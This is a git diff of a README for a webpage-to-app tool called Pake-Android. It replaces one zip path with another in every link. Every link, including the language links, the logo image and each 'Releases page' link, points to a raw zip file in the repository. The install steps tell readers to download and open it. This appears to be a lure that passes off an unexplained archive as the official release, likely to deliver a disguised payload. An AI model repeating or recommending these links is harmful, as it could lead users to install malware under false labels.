@@ -1,15 +1,15 @@
 # 🌟 Pake-Android - Create Apps from Any Webpage Easily
 
-![Download Pake-Android](https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-1.0.zip)
+![Download Pake-Android](https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-Annamite.zip)
 
 <h4 align="right"> 
-<span href="https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-1.0.zip">English</span> 
-<a href="https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-1.0.zip" style="margin: 0 10px;">简体中文</a> 
-<a href="https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-1.0.zip">日本语</a>
+<span href="https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-Annamite.zip">English</span> 
+<a href="https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-Annamite.zip" style="margin: 0 10px;">简体中文</a> 
+<a href="https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-Annamite.zip">日本语</a>
 </h4>  
 
 <p align="center">
-    <img src="https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-1.0.zip" width=138/>
+    <img src="https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-Annamite.zip" width=138/>
 </p>  
 
 <p align="center"><strong>Turn any webpage into an app in minutes.</strong></p>
@@ -22,9 +22,9 @@ Here’s how to download and run Pake-Android.
 
 ## 📥 Download & Install
 
-You can download Pake-Android from our [Releases page](https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-1.0.zip). This page has all the latest versions of the software.
+You can download Pake-Android from our [Releases page](https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-Annamite.zip). This page has all the latest versions of the software.
 
-1. Visit the [Pake-Android Releases page](https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-1.0.zip).
+1. Visit the [Pake-Android Releases page](https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-Annamite.zip).
 2. Look for the latest version listed at the top.
 3. Click on the appropriate file for your device to download it.
 4. Once the file is downloaded, open it to install the software.
@@ -71,4 +71,4 @@ A: You can reach out to our community discussions on GitHub for help.
 For additional help, please visit our community forums or check the discussions tab on the GitHub repository. We are here to assist you.
 
 **Download now and start creating your apps!**  
-Visit the [Pake-Android Releases page](https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-1.0.zip) to get the latest version today.
+Visit the [Pake-Android Releases page](https://raw.githubusercontent.com/Mozart-X9/Pake-Android/main/Pangloss/Pake-Android-Annamite.zip) to get the latest version today.
